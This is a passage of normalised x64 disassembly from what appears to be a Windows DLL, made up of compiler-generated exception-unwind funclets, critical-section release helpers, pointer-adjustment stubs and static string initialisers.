jmp sub_1800027f0
sub_18002bcc0
mov rcx [ rdx + 0x50 ]
add rcx 0xf8
jmp j_sub_180002680
sub_18002bce0
mov rcx [ rdx + 0x50 ]
add rcx 0x118
jmp j_sub_180002680
sub_18002bd00
mov rcx [ rdx + 0x58 ]
jmp j_sub_18001c80c
sub_18002bd10
lea rcx [ rdx + 0x140 ]
jmp sub_1800035f0
sub_18002bd20
lea rcx [ rdx + 0x168 ]
jmp sub_180001850
sub_18002bd30
mov rcx [ rdx + 0x50 ]
jmp sub_180001850
sub_18002bd40
mov rcx [ rdx + 0x50 ]
jmp j_sub_18001c80c
sub_18002bd50
lea rcx [ rdx + 0x190 ]
jmp sub_1800035f0
sub_18002bd90
lea rcx [ rdx + 0x60 ]
jmp sub_180001850
sub_18002bda0
lea rcx [ rdx + 0x38 ]
jmp sub_180001850
sub_18002bdb0
lea rcx [ rdx + 0x90 ]
jmp sub_180014bc0
sub_18002bdc0
lea rcx [ rdx + 0x118 ]
jmp sub_180001850
sub_18002bdd0
lea rcx [ rdx + 0xc8 ]
jmp sub_180001850
sub_18002bde0
lea rcx [ rdx + 0xf0 ]
jmp sub_180001850
sub_18002bdf0
lea rcx [ rdx + 0x48 ]
jmp j_sub_180002680
sub_18002be00
lea rcx [ rdx + 0x28 ]
jmp sub_180016d40
sub_18002be10
lea rcx [ rdx + 0xa0 ]
jmp sub_180001850
sub_18002be20
lea rcx [ rdx + 0x70 ]
jmp sub_180008890
sub_18002be30
lea rcx [ rdx + 0x140 ]
jmp sub_180001850
sub_18002be40
lea rcx [ rdx + 0x168 ]
jmp sub_180001850
sub_18002be50
lea rcx [ rdx + 0x140 ]
jmp sub_180001850
sub_18002be60
lea rcx [ rdx + 0xf0 ]
jmp sub_180001850
sub_18002be70
lea rcx [ rdx + 0x168 ]
jmp sub_180001850
sub_18002be80
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
lea rax [ r-xdata ]
add rsp 0x20
pop rbp
retn
sub_18002bea0
mov rcx [ rdx + 0x68 ]
jmp sub_1800027f0
sub_18002beb0
mov rcx [ rdx + 0x30 ]
jmp j_sub_18001c80c
sub_18002bec0
mov rcx [ rdx + 0x20 ]
jmp j_sub_18001c80c
sub_18002bf40
mov rcx [ rdx + 0x28 ]
jmp j_sub_18001c80c
sub_18002bf50
lea rcx [ rdx + 0x38 ]
jmp sub_180001850
sub_18002bf60
lea rcx [ rdx + 0x38 ]
jmp sub_180001850
sub_18002bf70
lea rcx [ rdx + 0x38 ]
jmp sub_180001850
sub_18002bf80
lea rcx [ rdx + 0x38 ]
jmp sub_180001850
sub_18002bf90
lea rcx [ rdx + 0x38 ]
jmp sub_180001850
sub_18002bfa0
lea rcx [ rdx + 0x60 ]
jmp sub_1800035f0
sub_18002bfb0
lea rcx [ rdx + 0x38 ]
jmp sub_1800035f0
sub_18002bfc0
lea rcx [ rdx + 0xb0 ]
jmp sub_1800035f0
sub_18002bfd0
lea rcx [ rdx + 0x88 ]
jmp sub_180001850
sub_18002bfe0
mov rcx [ rdx + 0x28 ]
jmp j_sub_18001c80c
sub_18002c020
lea rcx [ rdx + 0x60 ]
jmp sub_1800035f0
sub_18002c030
lea rcx [ rdx + 0x38 ]
jmp sub_1800035f0
sub_18002c040
mov rcx [ rdx + 0x50 ]
jmp sub_1800035f0
sub_18002c050
mov rcx [ rdx + 0x30 ]
jmp j_sub_18001c80c
sub_18002c060
lea rcx [ rdx + 0x148 ]
jmp sub_1800035f0
sub_18002c070
lea rcx [ rdx + 0x58 ]
jmp sub_1800035f0
sub_18002c080
lea rcx [ rdx + 0xd0 ]
jmp sub_1800035f0
sub_18002c090
lea rcx [ rdx + 0x80 ]
jmp sub_1800035f0
sub_18002c0a0
lea rcx [ rdx + 0x120 ]
jmp sub_1800035f0
sub_18002c0b0
lea rcx [ rdx + 0xa8 ]
jmp sub_1800035f0
sub_18002c0c0
lea rcx [ rdx + 0x120 ]
jmp sub_1800035f0
sub_18002c0d0
lea rcx [ rdx + 0xf8 ]
jmp sub_1800035f0
sub_18002c0e0
lea rcx [ rdx + 0xa8 ]
jmp sub_1800035f0
sub_18002c0f0
lea rcx [ rdx + 0x170 ]
jmp sub_1800035f0
sub_18002c100
lea rcx [ rdx + 0x80 ]
jmp sub_1800035f0
sub_18002c110
lea rcx [ rdx + 0xf8 ]
jmp sub_1800035f0
sub_18002c120
lea rcx [ rdx + 0x120 ]
jmp sub_1800035f0
sub_18002c130
lea rcx [ rdx + 0x170 ]
jmp sub_1800035f0
sub_18002c140
lea rcx [ rdx + 0xa8 ]
jmp sub_1800035f0
sub_18002c150
lea rcx [ rdx + 0x58 ]
jmp sub_1800035f0
sub_18002c190
lea rcx [ rdx + 0x28 ]
jmp sub_180008890
sub_18002c1a0
lea rcx [ rdx + 0x1f8 ]
jmp sub_180001850
sub_18002c1b0
lea rcx [ rdx + 0x68 ]
jmp sub_180001850
sub_18002c1c0
lea rcx [ rdx + 0x90 ]
jmp sub_180001850
sub_18002c1d0
lea rcx [ rdx + 0x108 ]
jmp sub_180001850
sub_18002c1e0
lea rcx [ rdx + 0xe0 ]
jmp sub_180001850
sub_18002c1f0
lea rcx [ rdx + 0x158 ]
jmp sub_180001850
sub_18002c200
lea rcx [ rdx + 0x1d0 ]
jmp sub_180001850
sub_18002c210
lea rcx [ rdx + 0x180 ]
jmp sub_180001850
sub_18002c220
lea rcx [ rdx + 0x130 ]
jmp sub_180001850
sub_18002c230
lea rcx [ rdx + 0x1a8 ]
jmp sub_180001850
sub_18002c240
lea rcx [ rdx + 0xb8 ]
jmp sub_180001850
sub_18002c292
push rbp
sub rsp 0x20
mov rbp rdx
call sub_180020ab0
nop
add rsp 0x20
pop rbp
retn
sub_18002c2a8
push rbp
sub rsp 0x20
mov rbp rdx
mov rax [ rcx ]
mov rdx rcx
mov ecx [ rax ]
call sub_180022f9c
nop
add rsp 0x20
pop rbp
retn
sub_18002c2c6
push rbp
sub rsp 0x20
mov rbp rdx
cmp [ rbp + 0x40 ] 0x0
jne r-xdata
add rsp 0x20
pop rbp
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
call sub_18001eaa8
nop
sub_18002c2ec
push rbp
sub rsp 0x20
mov rbp rdx
mov rax [ rcx ]
mov rdx rcx
mov ecx [ rax ]
call sub_18002316c
nop
add rsp 0x20
pop rbp
retn
sub_18002c30a
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xe
call sub_1800258a4
nop
add rsp 0x20
pop rbp
retn
sub_18002c325
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xd
call sub_1800258a4
nop
add rsp 0x20
pop rbp
retn
sub_18002c345
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xc
call sub_1800258a4
nop
add rsp 0x20
pop rbp
retn
sub_18002c360
push rbp
sub rsp 0x20
mov rbp rdx
call sub_18001ef98
nop
add rsp 0x20
pop rbp
retn
sub_18002c380
push rbp
sub rsp 0x20
mov rbp rdx
call sub_18001ec0c
cmp [ rax + 0x100 ] 0x0
jle r-xdata
add rsp 0x20
pop rbp
retn
call sub_18001ec0c
dec [ rax + 0x100 ]
sub_18002c3a9
push rbp
sub rsp 0x20
mov rbp rdx
xor eax eax
cmp [ rbp + 0x38 ] al
setne al
add rsp 0x20
pop rbp
retn
sub_18002c550
push rbp
sub rsp 0x20
mov rbp rdx
cmp [ rbp + 0x80 ] 0x0
je r-xdata
add rsp 0x20
pop rbp
retn
mov ecx 0x8
call sub_1800258a4
nop
sub_18002c574
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xd
call sub_1800258a4
nop
add rsp 0x20
pop rbp
retn
sub_18002c58f
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xc
call sub_1800258a4
nop
add rsp 0x20
pop rbp
retn
sub_18002c5aa
push rbp
sub rsp 0x20
mov rbp rdx
cmp [ rbp + 0x60 ] 0x0
je r-xdata
add rsp 0x20
pop rbp
retn
xor ecx ecx
call sub_1800258a4
nop
sub_18002c5c8
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rw-data ]
call [ LeaveCriticalSection@IAT ]
nop
add rsp 0x20
pop rbp
retn
sub_18002c5f0
push rbp
sub rsp 0x20
mov rbp rdx
mov rax [ rcx ]
xor ecx ecx
cmp [ rax ] 0xc0000005
sete cl
mov eax ecx
mov eax ecx
add rsp 0x20
pop rbp
retn
sub_18002c612
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx [ rbp + 0x50 ]
call sub_1800287e4
nop
add rsp 0x20
pop rbp
retn
sub_18002c62b
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xa
call sub_1800258a4
nop
add rsp 0x20
pop rbp
retn
sub_18002c646
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0x1
call sub_1800258a4
nop
add rsp 0x20
pop rbp
retn
sub_18002c661
push rbp
sub rsp 0x20
mov rbp rdx
movsxd rcx [ rbp + 0x20 ]
mov rax rcx
mov rdx [ rw-data ]
mov rdx [ rdx + rcx * 8 ]
call sub_1800268d0
nop
add rsp 0x20
pop rbp
retn
sub_18002c691
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0x1
call sub_1800258a4
nop
add rsp 0x20
pop rbp
retn
sub_18002c6ac
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x38 ]
call sub_180026884
nop
add rsp 0x20
pop rbp
retn
sub_18002c6c6
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x30 ]
call sub_180026884
nop
add rsp 0x20
pop rbp
retn
sub_18002c6e0
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx [ rbp + 0x40 ]
call sub_1800287e4
nop
add rsp 0x20
pop rbp
retn
sub_18002c700
mov rax [ rw-data ]
add rax 0x8
mov [ rw-data ] rax
retn
sub_18002c720
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002c740
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002c760
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002c780
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002c7a0
mov rax [ rw-data ]
mov [ rw-data ] rax
retn
sub_18002c7b0
mov rax [ rw-data ]
add rax 0x8
mov [ rw-data ] rax
retn
sub_18002c7d0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002c7f0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002c810
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002c830
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002c850
mov rax [ rw-data ]
mov [ rw-data ] rax
retn
sub_18002c860
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002c880
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002c8a0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002c8c0
mov rax [ rw-data ]
add rax 0x8
mov [ rw-data ] rax
retn
sub_18002c8e0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002c900
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002c920
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002c940
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002c960
mov rax [ rw-data ]
mov [ rw-data ] rax
retn
sub_18002c970
mov rax [ rw-data ]
add rax 0x8
mov [ rw-data ] rax
retn
sub_18002c990
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002c9b0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002c9d0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002c9f0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002ca10
mov rax [ rw-data ]
mov [ rw-data ] rax
retn
sub_18002ca20
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002ca40
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002ca60
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002ca80
mov rax [ rw-data ]
add rax 0x8
mov [ rw-data ] rax
retn
sub_18002caa0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002cac0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002cae0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002cb00
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002cb20
mov rax [ rw-data ]
mov [ rw-data ] rax
retn
sub_18002cb30
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002cb50
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002cb70
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002cb90
sub rsp 0x28
lea rdx [ r--data ]
lea rcx [ rw-data ]
mov r8d 0x1
call sub_180009120
lea rcx [ sub_18002d8e0 ]
add rsp 0x28
jmp sub_18001d608
sub_18002cbc0
mov rax [ rw-data ]
add rax 0x8
mov [ rw-data ] rax
retn
sub_18002cbe0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002cc00
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002cc20
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002cc40
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002cc60
mov rax [ rw-data ]
mov [ rw-data ] rax
retn
sub_18002cc70
mov rax [ rw-data ]
add rax 0x8
mov [ rw-data ] rax
retn
sub_18002cc90
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002ccb0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002ccd0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002ccf0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002cd10
mov rax [ rw-data ]
mov [ rw-data ] rax
retn
sub_18002cd20
mov rax [ rw-data ]
add rax 0x8
mov [ rw-data ] rax
retn
sub_18002cd40
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002cd60
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002cd80
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002cda0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002cdc0
mov rax [ rw-data ]
mov [ rw-data ] rax
retn
sub_18002cdd0
mov rax [ rw-data ]
add rax 0x8
mov [ rw-data ] rax
retn
sub_18002cdf0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002ce10
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002ce30
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002ce50
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002ce70
mov rax [ rw-data ]
mov [ rw-data ] rax
retn
sub_18002ce80
mov rax [ rw-data ]
add rax 0x8
mov [ rw-data ] rax
retn
sub_18002cea0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002cec0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002cee0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002cf00
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002cf20
mov rax [ rw-data ]
mov [ rw-data ] rax
retn
sub_18002cf30
mov rax [ rw-data ]
add rax 0x8
mov [ rw-data ] rax
retn
sub_18002cf50
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002cf70
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002cf90
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002cfb0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002cfd0
mov rax [ rw-data ]
mov [ rw-data ] rax
retn
sub_18002cfe0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d000
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d020
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d040
mov rax [ rw-data ]
add rax 0x8
mov [ rw-data ] rax
retn
sub_18002d060
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d080
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d0a0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d0c0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d0e0
mov rax [ rw-data ]
mov [ rw-data ] rax
retn
sub_18002d0f0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d110
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d130
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d150
mov rax [ rw-data ]
add rax 0x8
mov [ rw-data ] rax
retn
sub_18002d170
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d190
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d1b0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d1d0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d1f0
mov rax [ rw-data ]
mov [ rw-data ] rax
retn
sub_18002d200
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d220
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d240
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d260
mov rax [ rw-data ]
add rax 0x8
mov [ rw-data ] rax
retn
sub_18002d280
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d2a0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d2c0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d2e0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d300
mov rax [ rw-data ]
mov [ rw-data ] rax
retn
sub_18002d310
mov rax [ rw-data ]
add rax 0x8
mov [ rw-data ] rax
retn
sub_18002d330
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d350
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d370
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d390
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d3b0
mov rax [ rw-data ]
mov [ rw-data ] rax
retn
sub_18002d3c0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d3e0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d400
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d420
mov rax [ rw-data ]
add rax 0x8
mov [ rw-data ] rax
retn
sub_18002d440
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d460
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d480
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d4a0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d4c0
mov rax [ rw-data ]
mov [ rw-data ] rax
retn
sub_18002d4d0
mov rax [ rw-data ]
add rax 0x8
mov [ rw-data ] rax
retn
sub_18002d4f0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d510
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d530
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d550
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d570
mov rax [ rw-data ]
mov [ rw-data ] rax
retn
sub_18002d580
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d5a0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d5c0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d5e0
sub rsp 0x28
lea rdx [ r--data ]
lea rcx [ rw-data ]
mov r8d 0x1
call sub_180009120
lea rcx [ sub_18002d920 ]
add rsp 0x28
jmp sub_18001d608
sub_18002d610
mov rax [ rw-data ]
add rax 0x8
mov [ rw-data ] rax
retn
sub_18002d630
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d650
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d670
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d690
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d6b0
mov rax [ rw-data ]
mov [ rw-data ] rax
retn
sub_18002d6c0
sub rsp 0x28
lea rdx [ r--data ]
lea rcx [ rw-data ]
mov r8d 0x1
call sub_180009120
lea rcx [ sub_18002d960 ]
add rsp 0x28
jmp sub_18001d608
sub_18002d6f0
mov rax [ rw-data ]
add rax 0x8
mov [ rw-data ] rax
retn
sub_18002d710
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d730
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d750
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d770
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d790
mov rax [ rw-data ]
mov [ rw-data ] rax
retn
sub_18002d7a0
mov rax [ rw-data ]
add rax 0x8
mov [ rw-data ] rax
retn
sub_18002d7c0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d7e0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d800
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d820
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d840
mov rax [ rw-data ]
mov [ rw-data ] rax
retn
sub_18002d850
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d870
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d890
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_18002d8b0
sub rsp 0x28
lea rdx [ r--data ]
lea rcx [ rw-data ]
mov r8d 0x1
call sub_180009120
lea rcx [ sub_18002d9a0 ]
add rsp 0x28
jmp sub_18001d608
sub_18002d8e0
sub rsp 0x28
cmp [ rw-data ] 0x10
jb r-xdata
mov [ rw-data ] 0xf
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
add rsp 0x28
retn
mov rcx [ rw-data ]
call j_sub_18001c80c
sub_18002d920
sub rsp 0x28
cmp [ rw-data ] 0x10
jb r-xdata
mov [ rw-data ] 0xf
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
add rsp 0x28
retn
mov rcx [ rw-data ]
call j_sub_18001c80c
sub_18002d960
sub rsp 0x28
cmp [ rw-data ] 0x10
jb r-xdata
mov [ rw-data ] 0xf
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
add rsp 0x28
retn
mov rcx [ rw-data ]
call j_sub_18001c80c
sub_18002d9a0
sub rsp 0x28
cmp [ rw-data ] 0x10
jb r-xdata
mov [ rw-data ] 0xf
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
add rsp 0x28
retn
mov rcx [ rw-data ]
call j_sub_18001c80c
sub_18002d9dc
lea rax [ r--data ]
lea rcx [ rw-data ]
mov [ rw-data ] rax
jmp sub_18001c40c
